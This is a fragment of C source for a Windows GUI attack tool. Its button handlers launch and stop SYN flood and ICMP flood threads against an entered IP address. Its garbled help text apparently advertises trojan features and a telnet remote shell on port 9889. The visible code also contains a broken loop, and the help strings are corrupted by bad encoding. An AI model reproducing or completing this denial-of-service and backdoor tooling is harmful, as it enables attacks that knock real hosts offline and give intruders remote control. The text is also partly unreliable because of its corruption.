			iSynPort = atoi(cSynPort);
			iSynThread = atoi(cSynThread);
			if (strlen(cSynIp) < 7 || strlen(cSynIp) >15)
			{
				MessageBox(NULL,"IP Exit..","Error",0);
                break;
			}
			if (iSynPort < 1 || iSynPort >6000)
			{
				MessageBox(NULL,"Port Error...","Error",0);
				break;
			}
			if (iSynThread < 1 || iSynThread > 200)
			{
				MessageBox(NULL,"Thread Error...","Error",0);
				break;
			}
			strcpy(cip,cSynIp);
			port = iSynPort;
			for (i=0;i<iSynThread;i++);
			{
				hThreadSyn[i] = CreateThread(NULL,0,ThreadSynFlood,&pvParam,0,&dwThreadID);
			}

            SetDlgItemText(hwnd,IDC_MES,"Syn Flood Send OK ~~ !!");
			break;

        case IDC_SYNEND:
			GetDlgItemText(hwnd,IDC_SYNTHREAD,cSynThread,3);
			iSynThread = atoi(cSynThread);
			iSynThread++;
			for (i=0;i<iSynThread;i++)
			{
				TerminateThread(hThreadSyn[i],0);
			}
            SetDlgItemText(hwnd,IDC_MES,"Syn Flood End OK ~~ !!");
			break;

        case IDC_ICMPSEND:
		    GetDlgItemText(hwnd,IDC_ICMPIP,cIcmpIp,16);
			GetDlgItemText(hwnd,IDC_ICMPTHREAD,cIcmpThread,3);
			iIcmpThread = atoi(cIcmpThread);
			if (iIcmpThread < 1 || iIcmpThread > 200)
			{
				MessageBox(NULL,"Thread Error...","Error",0);
				break;
			}
			strcpy(cip,cIcmpIp);
			for (i=0;i<iIcmpThread;i++)
			{
				hThreadIcmp[i] = CreateThread(NULL,0,ThreadDosSend,&pvParam,0,&dwThreadID);
			}
            SetDlgItemText(hwnd,IDC_MES,"Icmp Flood Send OK ~~ !!");
			break;

        case IDC_ICMPEND:
			GetDlgItemText(hwnd,IDC_ICMPTHREAD,cIcmpThread,3);
			iIcmpThread = atoi(cIcmpThread);
			iIcmpThread++;
			for (i=0;i<iIcmpThread;i++)
			{
				TerminateThread(hThreadIcmp[i],0);
			}
            SetDlgItemText(hwnd,IDC_MES,"Icmp Flood End OK ~~ !!");
			break;

        case IDC_HELP1:
			GetDlgItemText(hwnd,IDC_HELP1,ButText,6);
			if (*ButText == 'A')
			{
				SetDlgItemText(hwnd,IDC_EDIT,"����:             ��������Ҫ��лCVC�����и����Ұ���������,�ر���jackhy,pkxp,pengjguo��.����Yonsm�������Ľ�������õ����Ŀ�:)");
				SetDlgItemText(hwnd,IDC_HELP1,"Help");
			}
			else
			{
                SetDlgItemText(hwnd,IDC_EDIT,"˵��:             ��������м򵥵�ľ��Ĺ���Ҳ�м򵥵�D.O.S�Ĺ�����Ϊľ��ʱ����԰�������Զ������Ȼ���������Ϳ���TELNET��Զ��������9889��,����һ��SHELL.");
                SetDlgItemText(hwnd,IDC_HELP1,"About");
			}

			break;

		case IDC_EXIT:
			ExitProcess(0);
		}
	}
	return 0;
}
